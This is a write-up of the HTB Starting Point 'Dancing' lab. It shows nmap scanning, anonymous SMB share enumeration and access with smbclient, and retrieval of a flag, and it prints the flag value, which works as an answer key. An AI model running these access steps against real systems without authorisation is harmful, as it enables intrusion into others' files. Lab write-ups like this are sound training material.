## üß† Summary
The Dancing machine from HTB Starting Point demonstrates enumeration and exploitation of SMB shares using anonymous access. We'll use **Nmap** for scanning and **smbclient** for accessing shares without credentials.

---

## üîç Tools Used
- **Nmap** ‚Äì Network scanning and service enumeration
- **smbclient** ‚Äì SMB share access and file retrieval

---

## ‚úÖ Steps to Exploit

### 1. Reconnaissance with Nmap
First, scan the target for open ports and services:
```bash
nmap -sC -sV 10.129.207.91
```
Result:

Key Findings:
- Port 135 ‚Üí Microsoft RPC
- Port 139 ‚Üí NetBIOS
- Port 445 ‚Üí SMB (microsoft-ds)

### 2. Enumerate SMB Shares
List available shares anonymously:
```bash
smbclient -L \\\\10.129.207.91\\ -N
```
**-L** : To list available shares
**-N** : No password prompt (useful for anonymous/guest access)
Result: Found a share named WorkShares

### 3. Access the WorkShares Share
Connect without a password:
```bash
smbclient \\\\10.129.207.91\\WorkShares -N
```
List the folders:
```bash
ls
```
We will see:
```bash
Amy.J
James.P
```

### 4. Browse Directories and Find the Flag
Navigate into Amy.J:
```bash
cd Amy.J
ls
```
File found: worknotes.txt (not needed for flag, but useful for context)
Go back and enter James.P:
```bash
cd ..
cd James.P
ls
```
Here we find flag.txt.

### 5. Download and Read the Flag
Download the flag file:
```bash
get flag.txt
```
Read it locally:
```bash
cat flag.txt
```
Flag:
```bash
5f61c10dffbc77a704d76016a22f1664
```

### Alternative Method (Optional)
You could also enumerate SMB shares using enum4linux or exploit with Metasploit:
```bash
use auxiliary/scanner/smb/smb_login
```

### Key Takeaways
- SMB shares are often misconfigured for anonymous access.
- Always start with Nmap, then enumerate with smbclient.
- Use Metasploit or enum4linux for automation in real-world scenarios.
